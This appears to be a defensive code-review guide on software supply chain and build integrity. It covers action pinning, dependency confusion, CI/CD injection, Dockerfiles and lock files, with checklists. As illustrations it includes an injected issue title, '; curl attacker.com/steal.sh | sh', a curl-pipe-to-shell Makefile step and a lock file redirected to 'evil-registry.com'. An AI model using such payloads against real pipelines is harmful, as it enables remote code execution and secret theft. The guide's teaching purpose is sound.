# Skill 08: Supply Chain and Build Integrity

The xz backdoor (CVE-2024-3094) was planted by a maintainer who spent 2.5 years building
trust. The event-stream attack hid a Bitcoin-stealing payload in a transitive npm
dependency. The tj-actions/changed-files compromise (CVE-2025-30066) retroactively modified
GitHub Action tags to inject secret-exfiltrating code. These aren't code bugs — they're
trust boundary failures.

## The Core Question

> "Can any untrusted code execute during build, test, or deployment? Is every dependency
> authenticated, pinned, and from a verified source?"

## What To Check

### 1. Dependency Pinning and Verification
**Red flags:**
```yaml
# BAD: mutable version
- uses: actions/checkout@v4  # tag can be changed retroactively

# GOOD: pinned to immutable SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

```json
// BAD in package.json: wide version ranges
"dependencies": {
    "lodash": "^4.0.0",  // accepts any 4.x.y
    "express": "*"         // accepts anything
}

// BETTER: exact versions with lock file
"dependencies": {
    "lodash": "4.17.21"
}
// AND: reviewed, committed package-lock.json
```

**Review check:**
- Are GitHub Actions pinned to commit SHAs, not tags?
- Are dependencies pinned to exact versions with a committed lock file?
- Does the lock file match the dependency specification?
- Are lock file changes reviewed (not rubber-stamped)?

### 2. Dependency Confusion / Substitution
**Red flags:**
- Private package names that could be registered on public registries
- Package manager configured to fall back from private to public registry
- No scope/namespace for internal packages

**Review check:** Could an attacker register a package on npm/PyPI/Maven with the same
name as an internal package? Is the package manager configured to use ONLY the intended
registry for each namespace?

### 3. CI/CD Pipeline Security
**Red flags:**
```yaml
# BAD: pull_request_target with checkout of PR code
on: pull_request_target
steps:
    - uses: actions/checkout@SHA
      with:
        ref: ${{ github.event.pull_request.head.sha }}
    # Now untrusted PR code runs with write permissions and secrets!

# BAD: macro expansion with attacker input
run: echo "${{ github.event.issue.title }}"
# If title is: "; curl attacker.com/steal.sh | sh; echo "

# BAD: secrets accessible to fork PRs
env:
    API_KEY: ${{ secrets.API_KEY }}
# Fork PRs shouldn't get secrets
```

**Review check:**
- Does any `pull_request_target` workflow check out PR code? (gives untrusted code secrets)
- Are `${{ }}` expressions used in `run:` blocks with attacker-controllable values?
- Are secrets scoped to protected branches only?
- Can fork PRs access secrets?

### 4. Build-Time Code Execution
**Red flags:**
```python
# setup.py can execute arbitrary code at install time
# An attacker's package can run code when pip install runs

# BAD in Makefile:
install:
    curl https://example.com/install.sh | sh
```

```json
// BAD in package.json:
"scripts": {
    "postinstall": "node ./scripts/download-binary.js"
    // What does this script download and execute?
}
```

**Review check:**
- Does the build process download and execute code from the internet?
- Do any dependencies have install lifecycle scripts (postinstall, preinstall)?
- Can the build be reproduced without network access (after initial dependency fetch)?

### 5. Dockerfile Security
**Red flags:**
```dockerfile
# BAD: running as root
FROM ubuntu:latest
RUN apt-get install -y my-app
CMD ["my-app"]
# Runs as root!

# BAD: secrets in build layers
COPY credentials.json /app/credentials.json
RUN my-app --init
RUN rm credentials.json  # Still in previous layer!

# BAD: latest tag (non-reproducible)
FROM node:latest

# GOOD:
FROM node:20.11.0-slim@sha256:abc123... AS builder
COPY --from=builder /app/dist /app
USER nonroot
```

**Review check:**
- Does the container run as non-root?
- Are any secrets COPY'd into the image (they persist in layers)?
- Is the base image pinned to a specific digest?
- Is a multi-stage build used to minimize the final image?

### 6. Release Tarball vs. Git Repository
The xz backdoor was in the release tarball but NOT in the git repository.

**Red flags:**
- Release process that adds files not in version control
- Autoconf/automake generated files in tarballs that differ from git
- Binary files in the repository without documented provenance
- Build scripts that process files differently than in development

**Review check:** Can the release artifact be reproduced from the git repository? Are
there files in the release tarball that don't exist in git? Are any build scripts modified
during the release process?

### 7. Maintainer Trust and Handoff
**Red flags:**
- New maintainer on a widely-used package (event-stream pattern)
- Maintainer adding new, unknown dependencies
- Sudden increase in binary/obfuscated files
- Build system changes that add preprocessing steps
- Pressure to merge quickly or bypass review

**Review check:** Has the maintainer recently changed? Is the new maintainer's identity
verified? Is this a sudden change in contribution pattern?

### 8. SBOM and Dependency Inventory
When Log4Shell hit, organizations that couldn't quickly identify which applications used
Log4j suffered the most.

**Review check:**
- Is there a complete inventory of all direct and transitive dependencies?
- Is the inventory automated and up-to-date?
- Is there a process for responding to dependency vulnerabilities?
- Are dependency vulnerability scanners running in CI?

### 9. Lock File Integrity
**Red flags:**
```diff
# Suspicious lock file changes:
- "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
+ "resolved": "https://evil-registry.com/lodash/-/lodash-4.17.21.tgz",

# Or: lock file changes without corresponding package.json changes
```

**Review check:** Do lock file changes correspond to package.json/requirements.txt
changes? Are registry URLs in the lock file pointing to expected registries?

### 10. Third-Party GitHub Actions
**Red flags:**
- Actions from unknown publishers with low star counts
- Actions requesting more permissions than needed
- Actions that aren't pinned to SHAs
- Actions with recent ownership transfers

**Review check:** For every third-party GitHub Action:
1. Is it from a trusted publisher?
2. Is it pinned to a commit SHA?
3. What permissions does it need and why?
4. When was it last updated and by whom?
5. Has the action been vendored/forked for control?

## The Supply Chain Audit

1. **Enumerate dependencies** — direct and transitive, runtime and build-time
2. **Verify sources** — are all dependencies from trusted registries?
3. **Check pinning** — exact versions with integrity hashes?
4. **Review build scripts** — any network calls, downloads, or code execution?
5. **Check CI/CD** — are workflows secure against injection and secret exposure?
6. **Check release process** — reproducible from source? No extra files?

## Catalog References
- S1 (xz backdoor) — malicious code in release tarball, not in git
- S2 (event-stream) — maintainer handoff to attacker
- S3 (tj-actions) — mutable git tags retroactively modified
- S5 (PyPI typosquatting) — similar package names
- I5 (dependency confusion) — private/public registry interaction
- I6 (GitHub Actions injection) — ${{ }} macro expansion with untrusted input
